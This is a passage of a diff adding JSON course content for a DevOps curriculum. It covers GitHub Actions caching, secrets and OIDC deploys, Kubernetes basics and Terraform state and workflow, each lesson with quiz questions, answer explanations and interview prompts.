+          "body": "`actions/cache` saves a directory under a **key** and restores it in later runs. Build the key from a hash of the lockfile so the cache invalidates exactly when dependencies change: `key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}`. `restore-keys` provides fallback prefixes for partial hits.\n\nWhat to cache:\n\n- The package manager's download cache (`~/.npm`), which `setup-node` does for you with `cache: npm`. Caching `node_modules` directly is fragile across Node versions and OSes.\n- Build caches: `.next/cache` for Next.js, Turborepo/Nx caches.\n- Docker layers via `docker/build-push-action` with `cache-from: type=gha` and `cache-to: type=gha,mode=max`.\n\nCaches are scoped by branch: a PR can read caches from its base branch, but not from other unrelated branches. Repositories have a total cache size limit and unused entries are evicted, so keys should be specific.\n\n**Artifacts vs caches**: artifacts are outputs you want to keep or pass between jobs (reports, builds); caches are inputs you want to reuse to speed up future runs."
+        },
+        {
+          "heading": "Secrets, variables and environments",
+          "body": "**Secrets** are encrypted values available via `${{ secrets.NAME }}`. They are masked in logs and are **not passed to workflows triggered from forks** (for `pull_request` events from forked repos). Scope them at organization, repository or environment level.\n\n**Variables** (`${{ vars.NAME }}`) hold non-sensitive configuration like region names.\n\n**Environments** (for example `staging`, `production`) group secrets and add **protection rules**: required reviewers, wait timers, and allowed branches. A job with `environment: production` pauses until approved and only then can read production secrets. This is how you implement gated continuous delivery.\n\nGotchas:\n\n- Masking is string-based; a secret transformed (base64 encoded, split) may leak unmasked. Do not echo secrets.\n- Structured data (JSON) as a secret masks poorly; store individual values.\n- Rotate secrets, and prefer short-lived credentials (OIDC) over long-lived ones."
+        },
+        {
+          "heading": "OIDC: deploy to the cloud without stored keys",
+          "body": "Instead of storing an AWS access key as a secret, a workflow can request a short-lived **OpenID Connect token** from GitHub. AWS (or GCP, Azure) trusts GitHub's OIDC provider and exchanges the token for temporary credentials for a specific IAM role.\n\nSetup: create an IAM OIDC identity provider for `token.actions.githubusercontent.com`, create a role whose trust policy restricts the `sub` claim to your repo and branch or environment (for example `repo:my-org/my-app:environment:production`), then grant the job `permissions: id-token: write`.\n\nBenefits: nothing to leak or rotate, credentials expire in about an hour, and access is limited to specific repos and branches. A trust policy that allows any repo (`repo:*`) is a serious misconfiguration.",
+          "code": {
+            "lang": "yaml",
+            "source": "  deploy:\n    needs: test\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    environment: production\n    permissions:\n      id-token: write   # needed to request the OIDC token\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n      - uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/gh-deploy\n          aws-region: us-east-1\n      - uses: aws-actions/amazon-ecr-login@v2\n        id: ecr\n      - uses: docker/setup-buildx-action@v3\n      - uses: docker/build-push-action@v6\n        with:\n          push: true\n          tags: ${{ steps.ecr.outputs.registry }}/app:${{ github.sha }}\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n      - run: aws ecs update-service --cluster prod --service app --force-new-deployment"
+          }
+        },
+        {
+          "heading": "Path filters, monorepos and release workflows",
+          "body": "In a monorepo, avoid running everything on every change:\n\n- `on.push.paths` / `paths-ignore` skip a workflow when irrelevant files change (careful: a skipped required check can block merging, so use a job-level filter like `dorny/paths-filter` or always-run summary jobs for required checks).\n- Tools like Turborepo and Nx compute **affected** packages and use remote caches.\n\nRelease automation: trigger on tags (`on: push: tags: ['v*']`) to build and publish, or use tools like Changesets or release-please that open a release PR and publish on merge.\n\n**Scheduled workflows** (`schedule: - cron: '0 3 * * *'`) run in UTC on the default branch, can be delayed under load, and are automatically disabled in public repos after 60 days of no repository activity."
+        }
+      ],
+      "keyPoints": [
+        "A matrix fans one job out over combinations; use `fail-fast: false` for full results and shards for slow suites.",
+        "Cache keys should hash the lockfile; cache download caches and build caches, not node_modules.",
+        "Artifacts pass outputs between jobs; caches speed up future runs.",
+        "Secrets are masked, scoped, and not exposed to fork PRs; variables hold non-secret config.",
+        "Environments add required reviewers and branch restrictions to protect production secrets.",
+        "OIDC (`id-token: write`) exchanges a GitHub token for short-lived cloud credentials, replacing stored keys.",
+        "Restrict OIDC trust policies by repo and branch/environment in the `sub` claim."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-06-q01",
+          "type": "mcq",
+          "prompt": "How many jobs does this matrix produce?",
+          "code": "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [20, 22, 24]\n    exclude:\n      - os: windows-latest\n        node: 20",
+          "options": [
+            "6",
+            "5",
+            "4",
+            "3"
+          ],
+          "answer": 1,
+          "explanation": "2 x 3 = 6 combinations, minus the one excluded (windows + node 20) = 5 jobs."
+        },
+        {
+          "id": "devops-cloud-06-q02",
+          "type": "mcq",
+          "prompt": "Which cache key invalidates exactly when dependencies change?",
+          "options": [
+            "key: npm-cache",
+            "key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}",
+            "key: npm-${{ github.sha }}",
+            "key: npm-${{ github.run_id }}"
+          ],
+          "answer": 1,
+          "explanation": "Hashing the lockfile ties the cache to the dependency set. A static key never refreshes; SHA or run-id keys miss every time."
+        },
+        {
+          "id": "devops-cloud-06-q03",
+          "type": "mcq",
+          "prompt": "A deploy job needs AWS access without storing keys. Which permission must the job have?",
+          "options": [
+            "contents: write",
+            "id-token: write",
+            "actions: write",
+            "packages: read"
+          ],
+          "answer": 1,
+          "explanation": "`id-token: write` lets the job request a GitHub OIDC token, which AWS STS exchanges for temporary role credentials."
+        },
+        {
+          "id": "devops-cloud-06-q04",
+          "type": "mcq",
+          "prompt": "A PR from a forked repository fails because `secrets.API_KEY` is empty. Why?",
+          "options": [
+            "The secret expired",
+            "Secrets are not passed to workflows triggered by pull requests from forks, to stop untrusted code from exfiltrating them",
+            "Secrets only work on Windows runners",
+            "The secret must be uppercase"
+          ],
+          "answer": 1,
+          "explanation": "Fork PR code is untrusted. GitHub withholds secrets (and gives a read-only token) for `pull_request` events from forks."
+        },
+        {
+          "id": "devops-cloud-06-q05",
+          "type": "mcq",
+          "prompt": "What is the best way to require a manual approval before deploying to production?",
+          "options": [
+            "Add `sleep 3600` to the job",
+            "Use an environment named production with required reviewers, and set `environment: production` on the deploy job",
+            "Ask people not to merge",
+            "Use workflow_dispatch only"
+          ],
+          "answer": 1,
+          "explanation": "Environment protection rules pause the job until a reviewer approves, and keep production secrets inaccessible until then."
+        },
+        {
+          "id": "devops-cloud-06-q06",
+          "type": "mcq",
+          "prompt": "Which setting makes `docker/build-push-action` reuse layers across workflow runs?",
+          "options": [
+            "cache-from: type=gha and cache-to: type=gha,mode=max",
+            "no-cache: true",
+            "pull: true",
+            "push: false"
+          ],
+          "answer": 0,
+          "explanation": "The `gha` cache backend stores BuildKit layer cache in the GitHub Actions cache; `mode=max` also caches intermediate stages."
+        },
+        {
+          "id": "devops-cloud-06-q07",
+          "type": "truefalse",
+          "prompt": "With the default `fail-fast: true`, one failing matrix job cancels the other in-progress matrix jobs.",
+          "answer": true,
+          "explanation": "fail-fast is on by default. Set it to false to let all combinations finish."
+        },
+        {
+          "id": "devops-cloud-06-q08",
+          "type": "truefalse",
+          "prompt": "Caching node_modules directly is generally preferred over caching the npm download cache.",
+          "answer": false,
+          "explanation": "node_modules contains platform-specific binaries and can go stale. Caching ~/.npm and running `npm ci` is the robust approach."
+        },
+        {
+          "id": "devops-cloud-06-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are advantages of OIDC federation over storing cloud access keys as secrets?",
+          "options": [
+            "Credentials are short-lived and expire automatically",
+            "No long-lived secret to leak or rotate",
+            "Access can be restricted to specific repos, branches or environments",
+            "It removes the need for IAM roles",
+            "It makes workflows run faster"
+          ],
+          "answers": [
+            0,
+            1,
+            2
+          ],
+          "explanation": "OIDC still uses an IAM role (it assumes one). Its benefits are short-lived, scoped credentials and no static secret."
+        },
+        {
+          "id": "devops-cloud-06-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: The workflow event that runs on a cron expression is `___`.",
+          "accept": [
+            "schedule",
+            "schedule:",
+            "on: schedule"
+          ],
+          "explanation": "`on: schedule: - cron: '...'` runs workflows in UTC on the default branch."
+        },
+        {
+          "id": "devops-cloud-06-q11",
+          "type": "interview",
+          "prompt": "Design a GitHub Actions pipeline that builds a Docker image and deploys it to AWS ECS with staging and production.",
+          "answer": "- On PR: lint, type check, unit/integration tests (services: postgres), Docker build without push to validate the Dockerfile.\n- On merge to main: build once with buildx using GHA layer cache, tag with the commit SHA, push to ECR, scan the image (Trivy or ECR scanning).\n- Deploy to staging: job with `environment: staging`, OIDC role for staging, render a new task definition with the SHA image (`aws-actions/amazon-ecs-render-task-definition` + `amazon-ecs-deploy-task-definition` with wait-for-stability), run smoke tests.\n- Deploy to production: `environment: production` with required reviewers, separate OIDC role restricted to that environment, same image SHA promoted. ECS rolling or CodeDeploy blue-green with automatic rollback on alarm.\n- Migrations as a one-off ECS task before the service update, written expand/contract.\n- Notifications on failure, concurrency group per environment to prevent overlapping deploys.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-06-q12",
+          "type": "interview",
+          "prompt": "Your E2E suite takes 30 minutes in CI. How would you use Actions features to speed it up?",
+          "answer": "- Shard the suite with a matrix (`shard: [1..6]`, Playwright `--shard=i/6`) and merge reports in a final job via artifacts.\n- Build the app once in a separate job, upload the build as an artifact, and have shards download it instead of each rebuilding.\n- Cache browsers (`~/.cache/ms-playwright`) keyed on the Playwright version and npm cache keyed on the lockfile.\n- Run E2E only when relevant paths change; keep a smaller smoke subset on PRs and the full suite on main/nightly.\n- Use larger runners if CPU bound, and `concurrency` to cancel superseded runs.\n- Fix flaky tests rather than retrying, and track test duration to rebalance shards.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-06-q13",
+          "type": "interview",
+          "prompt": "How do you configure the AWS side of GitHub OIDC so only your production deploys can assume the deploy role?",
+          "answer": "- Create the IAM OIDC provider for `https://token.actions.githubusercontent.com` with audience `sts.amazonaws.com`.\n- Role trust policy: principal is that federated provider, action `sts:AssumeRoleWithWebIdentity`, with conditions `token.actions.githubusercontent.com:aud = sts.amazonaws.com` and `token.actions.githubusercontent.com:sub = repo:my-org/my-app:environment:production` (StringEquals, not a broad wildcard).\n- Attach a least-privilege permission policy: push to one ECR repo, update one ECS service, pass only the task role.\n- In GitHub, protect the production environment with required reviewers and restrict it to the main branch, so the `sub` claim can only be minted after approval.\n- Monitor with CloudTrail for AssumeRoleWithWebIdentity events.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "GitHub Docs - Running variations of jobs in a workflow (matrix)",
+          "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow"
+        },
+        {
+          "title": "GitHub Docs - Configuring OpenID Connect in Amazon Web Services",
+          "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services"
+        },
+        {
+          "title": "GitHub Docs - Managing environments for deployment",
+          "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-07-kubernetes",
+      "title": "Kubernetes Basics",
+      "level": "intermediate",
+      "summary": "Pods, Deployments, Services, Ingress, ConfigMaps, Secrets, probes and resources: enough Kubernetes to deploy and debug a web app.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "What Kubernetes does",
+          "body": "Kubernetes (K8s) is a container orchestrator. You declare the **desired state** (\"run 3 replicas of image app:abc123, expose them on port 80\") and **controllers** continuously reconcile the actual state toward it: restarting crashed containers, rescheduling pods from failed nodes, and rolling out new versions.\n\nArchitecture in brief:\n\n- **Control plane**: the API server (everything talks to it), etcd (the state store), the scheduler (assigns pods to nodes) and controller managers. Managed services (EKS, GKE, AKS) run this for you.\n- **Nodes**: worker machines running the kubelet (starts containers via a runtime such as containerd) and kube-proxy (service networking).\n\nYou interact with `kubectl` and YAML manifests, usually applied by CI or a GitOps tool such as Argo CD or Flux."
+        },
+        {
+          "heading": "Pods and Deployments",
+          "body": "A **Pod** is the smallest deployable unit: one or more containers that share a network namespace (same IP, talk over localhost) and can share volumes. Pods are ephemeral and get new IPs when recreated, so you rarely create them directly.\n\nA **Deployment** manages a **ReplicaSet**, which keeps N identical pods running. Changing the pod template (for example the image tag) triggers a rolling update; `kubectl rollout undo deployment/api` rolls back.\n\nOther workload types: **StatefulSet** (stable identities and per-pod storage, for databases), **DaemonSet** (one pod per node, for log agents), **Job/CronJob** (run to completion, scheduled tasks).",
+          "code": {
+            "lang": "yaml",
+            "source": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels: { app: api }\n  template:\n    metadata:\n      labels: { app: api }\n    spec:\n      containers:\n        - name: api\n          image: ghcr.io/acme/api:3f9c2e1\n          ports:\n            - containerPort: 3000\n          envFrom:\n            - configMapRef: { name: api-config }\n            - secretRef: { name: api-secrets }\n          resources:\n            requests: { cpu: 250m, memory: 256Mi }\n            limits: { memory: 512Mi }\n          readinessProbe:\n            httpGet: { path: /healthz/ready, port: 3000 }\n            periodSeconds: 5\n          livenessProbe:\n            httpGet: { path: /healthz/live, port: 3000 }\n            initialDelaySeconds: 10"
+          }
+        },
+        {
+          "heading": "Services and Ingress",
+          "body": "A **Service** gives a stable virtual IP and DNS name (`api.default.svc.cluster.local`, or just `api` within the namespace) in front of a changing set of pods selected by **labels**.\n\n- `ClusterIP` (default): reachable only inside the cluster.\n- `NodePort`: opens a port on every node.\n- `LoadBalancer`: provisions a cloud load balancer.\n- Headless (`clusterIP: None`): DNS returns pod IPs directly, used with StatefulSets.\n\nAn **Ingress** defines HTTP routing (host and path based) from outside to Services, implemented by an **ingress controller** (ingress-nginx, Traefik, AWS Load Balancer Controller). Without a controller installed, Ingress objects do nothing. The newer **Gateway API** (Gateway, HTTPRoute) is the successor with richer, role-oriented routing and is the direction new setups are moving.",
+          "code": {
+            "lang": "yaml",
+            "source": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api\nspec:\n  selector: { app: api }\n  ports:\n    - port: 80\n      targetPort: 3000\n---\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: web\nspec:\n  ingressClassName: nginx\n  tls:\n    - hosts: [app.example.com]\n      secretName: app-tls\n  rules:\n    - host: app.example.com\n      http:\n        paths:\n          - path: /api\n            pathType: Prefix\n            backend:\n              service: { name: api, port: { number: 80 } }"
+          }
+        },
+        {
+          "heading": "ConfigMaps, Secrets, probes and resources",
+          "body": "**ConfigMaps** hold non-sensitive config; **Secrets** hold sensitive values. Both can be exposed as env vars or mounted files. Important: Secrets are only **base64 encoded**, not encrypted, by default. Enable encryption at rest for etcd, restrict access with RBAC, and consider External Secrets Operator or a CSI driver to sync from AWS Secrets Manager or Vault. Env vars from ConfigMaps do not update in running pods; restart the Deployment (`kubectl rollout restart`).\n\n**Probes**:\n\n- **Readiness**: is the pod ready to receive traffic? Failing removes it from Service endpoints but does not restart it.\n- **Liveness**: is the process stuck? Failing restarts the container. Do not check dependencies (like the DB) in liveness, or a DB blip restarts every pod.\n- **Startup**: holds off the other probes for slow-starting apps.\n\n**Resources**: `requests` are what the scheduler reserves; `limits` are hard caps. Exceeding the memory limit gets the container **OOMKilled**; exceeding CPU limits causes throttling. A common practice is setting memory request equal to the limit and avoiding tight CPU limits. A **HorizontalPodAutoscaler** scales replicas based on CPU utilization relative to requests or on custom metrics."
+        },
+        {
+          "heading": "Debugging with kubectl",
+          "body": "The commands that solve most problems:\n\n- `kubectl get pods -o wide`: status, restarts, node.\n- `kubectl describe pod <name>`: events at the bottom explain scheduling failures, image pull errors, probe failures, OOMKilled.\n- `kubectl logs <pod> [-c container] [--previous]`: `--previous` shows logs of the crashed instance.\n- `kubectl exec -it <pod> -- sh`: shell into a container.\n- `kubectl port-forward svc/api 8080:80`: reach a ClusterIP service locally.\n- `kubectl get endpoints api` (or EndpointSlices): empty means the Service selector matches no ready pods.\n- `kubectl rollout status|history|undo deployment/api`.\n\nCommon statuses: **ImagePullBackOff** (wrong image name/tag or missing registry credentials), **CrashLoopBackOff** (container keeps exiting: check `logs --previous`), **Pending** (no node has enough requested CPU/memory, or an unbound volume), **OOMKilled** (raise memory limit or fix the leak)."
+        }
+      ],
+      "keyPoints": [
+        "Kubernetes reconciles declared desired state; controllers fix drift continuously.",
+        "Pods are ephemeral; Deployments manage ReplicaSets and rolling updates with rollback.",
+        "Services select pods by label and provide stable DNS; Ingress (via a controller) routes external HTTP.",
+        "Secrets are base64, not encrypted, by default: enable encryption at rest and RBAC.",
+        "Readiness gates traffic, liveness restarts containers; keep dependencies out of liveness checks.",
+        "Requests drive scheduling; exceeding the memory limit causes OOMKilled.",
+        "`kubectl describe` events and `logs --previous` diagnose most failures."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-07-q01",
+          "type": "mcq",
+          "prompt": "Which object provides a stable DNS name and virtual IP for a set of pods?",
+          "options": [
+            "ConfigMap",
+            "Service",
+            "ReplicaSet",
+            "Namespace"
+          ],
+          "answer": 1,
+          "explanation": "A Service selects pods by label and load balances across them behind a stable name, even as pod IPs change."
+        },
+        {
+          "id": "devops-cloud-07-q02",
+          "type": "mcq",
+          "prompt": "A pod shows status CrashLoopBackOff. What is the best first command?",
+          "options": [
+            "kubectl delete node",
+            "kubectl logs <pod> --previous",
+            "kubectl scale --replicas=0",
+            "kubectl get ingress"
+          ],
+          "answer": 1,
+          "explanation": "CrashLoopBackOff means the container keeps exiting. `--previous` shows the logs of the last crashed instance, which usually contain the error."
+        },
+        {
+          "id": "devops-cloud-07-q03",
+          "type": "mcq",
+          "prompt": "A pod's readiness probe starts failing. What happens?",
+          "options": [
+            "The container is restarted",
+            "The pod is removed from Service endpoints and stops receiving traffic, but is not restarted",
+            "The node is drained",
+            "The Deployment is rolled back"
+          ],
+          "answer": 1,
+          "explanation": "Readiness controls traffic routing. Liveness failures are what trigger restarts."
+        },
+        {
+          "id": "devops-cloud-07-q04",
+          "type": "mcq",
+          "prompt": "Your Ingress resource is created but nothing routes traffic. What is the most likely reason?",
+          "options": [
+            "Ingress only works with NodePort",
+            "No ingress controller is installed (or the ingressClassName does not match one)",
+            "Ingress requires a StatefulSet",
+            "Services cannot be used with Ingress"
+          ],
+          "answer": 1,
+          "explanation": "Ingress is only a configuration object. An ingress controller (ingress-nginx, Traefik, ALB controller) must watch and implement it."
+        },
+        {
+          "id": "devops-cloud-07-q05",
+          "type": "mcq",
+          "prompt": "Which workload type fits a Postgres cluster where each replica needs a stable name and its own persistent volume?",
+          "options": [
+            "Deployment",
+            "DaemonSet",
+            "StatefulSet",
+            "Job"
+          ],
+          "answer": 2,
+          "explanation": "StatefulSets give pods stable ordinal identities (db-0, db-1) and volumeClaimTemplates for per-pod storage."
+        },
+        {
+          "id": "devops-cloud-07-q06",
+          "type": "mcq",
+          "prompt": "A container repeatedly shows `OOMKilled`. What does that mean?",
+          "options": [
+            "It exceeded its CPU limit",
+            "It exceeded its memory limit and the kernel killed it",
+            "The image could not be pulled",
+            "The liveness probe timed out"
+          ],
+          "answer": 1,
+          "explanation": "Memory is not compressible: exceeding the memory limit kills the process. CPU over-limit only causes throttling."
+        },
+        {
+          "id": "devops-cloud-07-q07",
+          "type": "truefalse",
+          "prompt": "Kubernetes Secrets are encrypted by default because their values are base64 encoded.",
+          "answer": false,
+          "explanation": "Base64 is an encoding, trivially reversible. Encryption at rest must be configured (managed clusters often offer KMS envelope encryption), and access restricted via RBAC."
+        },
+        {
+          "id": "devops-cloud-07-q08",
+          "type": "truefalse",
+          "prompt": "Containers in the same pod can reach each other on localhost.",
+          "answer": true,
+          "explanation": "Containers in a pod share one network namespace, so they share an IP and port space. This enables sidecar patterns."
+        },
+        {
+          "id": "devops-cloud-07-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which can cause a pod to stay in Pending?",
+          "options": [
+            "No node has enough unreserved CPU/memory for its requests",
+            "A PersistentVolumeClaim it uses is not bound",
+            "Its application throws an exception at startup",
+            "Node taints it does not tolerate / unsatisfiable node affinity",
+            "A failing readiness probe"
+          ],
+          "answers": [
+            0,
+            1,
+            3
+          ],
+          "explanation": "Pending means not yet scheduled or started. App exceptions cause CrashLoopBackOff, and readiness failures leave the pod Running but not Ready."
+        },
+        {
+          "id": "devops-cloud-07-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: To roll a Deployment back to its previous revision, run `kubectl rollout ___ deployment/api`.",
+          "accept": [
+            "undo"
+          ],
+          "explanation": "`kubectl rollout undo` reverts to the previous ReplicaSet revision; `--to-revision` targets a specific one."
+        },
+        {
+          "id": "devops-cloud-07-q11",
+          "type": "interview",
+          "prompt": "Explain the difference between liveness, readiness and startup probes, and a common mistake with each.",
+          "answer": "- Readiness: decides if the pod receives traffic. Mistake: none configured, so traffic hits pods before they warm up, or during shutdown. It can check critical dependencies carefully.\n- Liveness: decides if the container must be restarted because it is wedged. Mistake: checking the database or other dependencies, so a dependency outage restarts every pod and makes things worse; or too aggressive timeouts that kill a busy but healthy app.\n- Startup: protects slow-starting apps by disabling liveness/readiness until it succeeds. Mistake: using a long liveness initialDelaySeconds instead, which delays detection of real hangs forever after.\n- Also: handle SIGTERM and fail readiness during shutdown so the pod is removed from endpoints before exiting.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-07-q12",
+          "type": "interview",
+          "prompt": "A Service returns connection refused / no endpoints. How do you debug it?",
+          "answer": "- `kubectl get endpoints <svc>` or `kubectl get endpointslices -l kubernetes.io/service-name=<svc>`: if empty, the Service selector does not match any ready pods.\n- Compare `kubectl get svc <svc> -o yaml` selector with pod labels (`kubectl get pods --show-labels`). Typos are common.\n- If pods match but are not Ready, check readiness probe failures in `kubectl describe pod`.\n- Check `targetPort` matches the container's listening port and the app binds to 0.0.0.0, not 127.0.0.1.\n- Test from inside the cluster: `kubectl run tmp --rm -it --image=busybox -- wget -qO- http://svc:port`.\n- Check NetworkPolicies that might block traffic, and namespace (DNS `svc.namespace`).",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-07-q13",
+          "type": "interview",
+          "prompt": "How do requests, limits and the HorizontalPodAutoscaler work together?",
+          "answer": "- Requests are the guaranteed reservation used by the scheduler to place pods; the sum of requests on a node cannot exceed its allocatable capacity.\n- Limits cap usage: memory over limit -> OOMKilled; CPU over limit -> throttled. Pods with requests = limits for all resources get Guaranteed QoS and are evicted last.\n- HPA computes desired replicas from observed metrics vs targets, for example average CPU utilization as a percentage of requests: if pods use 90% of requests and the target is 60%, it scales up by about 1.5x.\n- So bad requests break autoscaling: too low and HPA scales too eagerly and nodes overcommit; too high and you waste capacity.\n- Cluster Autoscaler or Karpenter then adds nodes when pods are Pending for lack of capacity.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "Kubernetes Concepts",
+          "url": "https://kubernetes.io/docs/concepts/"
+        },
+        {
+          "title": "Configure Liveness, Readiness and Startup Probes",
+          "url": "https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/"
+        },
+        {
+          "title": "kubectl Quick Reference",
+          "url": "https://kubernetes.io/docs/reference/kubectl/quick-reference/"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-08-terraform",
+      "title": "Infrastructure as Code with Terraform",
+      "level": "advanced",
+      "summary": "Declarative infrastructure with Terraform: providers, resources, state, modules, plans in CI and handling drift safely.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "Why Infrastructure as Code",
+          "body": "Clicking resources together in a cloud console is unrepeatable, unreviewable and undocumented. **Infrastructure as Code (IaC)** defines infrastructure in versioned files, so changes go through pull requests, environments are reproducible, and disaster recovery is re-applying code.\n\nTools:\n\n- **Terraform** (HashiCorp, BSL license) and **OpenTofu** (the open-source MPL fork under the Linux Foundation, largely compatible): declarative HCL, multi-cloud via providers.\n- **AWS CloudFormation / CDK**: AWS-native; CDK lets you write TypeScript that synthesizes CloudFormation.\n- **Pulumi**: real programming languages (TypeScript, Python, Go) with its own engine.\n\nDeclarative means you describe the end state; the tool computes the diff from current state and applies only what is needed."
+        },
+        {
+          "heading": "Core workflow: init, plan, apply",
+          "body": "- `terraform init`: downloads providers and modules, configures the backend.\n- `terraform fmt` and `terraform validate`: formatting and static validation.\n- `terraform plan`: shows what will be created (+), changed (~), destroyed (-) or replaced (-/+). Always read it; a `-/+` on a database means data loss.\n- `terraform apply`: executes the plan. In CI, save the plan with `-out=tfplan` and apply exactly that file.\n- `terraform destroy`: tears everything down.\n\nResources reference each other (`aws_s3_bucket.uploads.id`), which builds a dependency graph; Terraform creates independent resources in parallel and dependent ones in order.",
+          "code": {
+            "lang": "hcl",
+            "source": "terraform {\n  required_version = \">= 1.6\"\n  required_providers {\n    aws = { source = \"hashicorp/aws\", version = \"~> 5.0\" }\n  }\n  backend \"s3\" {\n    bucket       = \"acme-tf-state\"\n    key          = \"app/prod/terraform.tfstate\"\n    region       = \"us-east-1\"\n    use_lockfile = true   # S3 native state locking\n    encrypt      = true\n  }\n}\n\nprovider \"aws\" {\n  region = var.region\n}\n\nvariable \"region\" {\n  type    = string\n  default = \"us-east-1\"\n}\n\nresource \"aws_s3_bucket\" \"uploads\" {\n  bucket = \"acme-uploads-${var.env}\"\n  tags   = { env = var.env }\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"uploads\" {\n  bucket                  = aws_s3_bucket.uploads.id\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n\noutput \"bucket_name\" {\n  value = aws_s3_bucket.uploads.bucket\n}"
+          }
+        },
+        {
+          "heading": "State: the most important concept",
+          "body": "Terraform keeps a **state file** mapping resources in code to real cloud objects (IDs, attributes). Without it, Terraform cannot know what it manages.\n\n- Store state **remotely** (S3, HCP Terraform, GCS, Azure Blob), never only on a laptop, and never commit it to Git: it can contain secrets in plain text, such as generated database passwords.\n- Use **state locking** so two applies cannot run at once and corrupt state. Historically on AWS this was a DynamoDB table; newer Terraform versions support S3 native locking via `use_lockfile = true`.\n- Enable bucket versioning and encryption for the state bucket.\n- Split state by environment and component (network, data, app) to limit blast radius and speed up plans.\n\nState operations: `terraform import` (or `import` blocks) to adopt existing resources, `terraform state mv` (or `moved` blocks) when refactoring names, `terraform state rm` to stop managing something without deleting it."
+        },
+        {
+          "heading": "Variables, modules and environments",
+          "body": "**Input variables** parameterize config; **outputs** expose values; **locals** hold computed values. Mark sensitive values with `sensitive = true` to hide them in plan output (they are still in state).\n\n**Modules** are reusable packages of resources (a folder with inputs and outputs). Use them for patterns repeated across environments, like 'a VPC' or 'an ECS service with ALB'. Pin module versions. The public Terraform Registry has well-maintained community modules (for example `terraform-aws-modules/vpc/aws`).\n\nEnvironments: the common approaches are a directory per environment (`envs/staging`, `envs/prod`) that each call shared modules with different variables, or workspaces. Separate directories with separate state and separate cloud accounts give the strongest isolation.\n\n`count` and `for_each` create multiple instances. Prefer `for_each` with a map: with `count`, removing an item from the middle of a list shifts indexes and forces unnecessary destroy/recreate.",
+          "code": {
+            "lang": "hcl",
+            "source": "module \"vpc\" {\n  source  = \"terraform-aws-modules/vpc/aws\"\n  version = \"~> 5.0\"\n\n  name            = \"app-${var.env}\"\n  cidr            = \"10.0.0.0/16\"\n  azs             = [\"us-east-1a\", \"us-east-1b\"]\n  private_subnets = [\"10.0.1.0/24\", \"10.0.2.0/24\"]\n  public_subnets  = [\"10.0.101.0/24\", \"10.0.102.0/24\"]\n}\n\nresource \"aws_sqs_queue\" \"q\" {\n  for_each = toset([\"emails\", \"thumbnails\", \"webhooks\"])\n  name     = \"${var.env}-${each.key}\"\n}"
+          }
+        },
+        {
+          "heading": "Terraform in CI, drift and safety",
+          "body": "A mature workflow:\n\n- On PR: `fmt -check`, `validate`, lint (tflint), security scan (Checkov, Trivy), then `plan` and post the plan as a PR comment.\n- On merge: apply the reviewed plan with credentials from OIDC, with an environment approval for production.\n- Tools such as Atlantis, HCP Terraform, Spacelift or env0 automate this.\n\n**Drift** is when real infrastructure differs from code because someone changed it manually. `terraform plan` shows the drift; you either codify the change or let apply revert it. Run scheduled plans to detect drift and restrict console write access.\n\nSafety features:\n\n- `lifecycle { prevent_destroy = true }` on databases and state buckets.\n- `create_before_destroy` for zero-downtime replacement.\n- `ignore_changes` for attributes managed elsewhere (for example a desired count changed by autoscaling).\n- Read `-/+ must be replaced` lines carefully: changing some attributes (like an RDS identifier) forces replacement."
+        }
+      ],
+      "keyPoints": [
+        "IaC makes infrastructure reviewable, reproducible and recoverable through version control.",
+        "init -> plan -> apply; in CI, apply the saved plan that was reviewed.",
+        "State maps code to real resources: store it remotely, encrypted, versioned and locked; never in Git.",
+        "Sensitive values still land in state, so protect the state backend like a secret.",
+        "Use modules with pinned versions; prefer `for_each` over `count` for stable addressing.",
+        "Drift = manual changes; detect with scheduled plans and limit console access.",
+        "Guard critical resources with `prevent_destroy` and read replace (-/+) actions carefully."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-08-q01",
+          "type": "mcq",
+          "prompt": "What does the Terraform state file primarily do?",
+          "options": [
+            "Stores provider binaries",
+            "Maps resources in configuration to real-world objects and their attributes",
+            "Holds the HCL source code",
+            "Logs every API call"
+          ],
+          "answer": 1,
+          "explanation": "State binds `aws_s3_bucket.uploads` to the actual bucket, enabling Terraform to compute diffs and track dependencies."
+        },
+        {
+          "id": "devops-cloud-08-q02",
+          "type": "mcq",
+          "prompt": "Two engineers run `terraform apply` on the same state at the same time. What prevents corruption?",
+          "options": [
+            "terraform fmt",
+            "State locking in the backend",
+            "Modules",
+            "Output values"
+          ],
+          "answer": 1,
